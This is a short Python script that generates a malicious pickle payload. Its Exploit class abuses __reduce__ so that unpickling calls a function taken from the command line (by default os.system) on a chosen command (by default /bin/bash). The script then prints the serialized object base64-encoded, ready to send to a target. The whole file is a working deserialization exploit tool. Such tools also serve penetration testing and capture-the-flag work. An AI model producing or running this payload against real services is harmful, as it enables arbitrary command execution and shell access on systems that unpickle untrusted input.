import base64
import os
import sys
import pickle

class Exploit(object):
    def __reduce__(self):
        return (eval(fn), (cmd,))

try:
    pickle_type = sys.argv[3]
    cmd = sys.argv[2]
    fn = sys.argv[1]
except:
    pickle_type = 'pickle' # or cpickle
    cmd = '/bin/bash'
    fn = 'os.system'

print("Will {} {}({})".format(pickle_type, fn, cmd))
shellcode = base64.b64encode(pickle.dumps(Exploit()))
print(shellcode)